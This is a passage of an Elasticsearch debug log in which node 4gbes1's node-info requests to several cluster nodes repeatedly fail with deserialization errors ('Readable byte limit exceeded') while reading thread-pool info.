    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,141][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,396][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,397][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,397][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,401][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:310)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,419][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,596][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,598][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
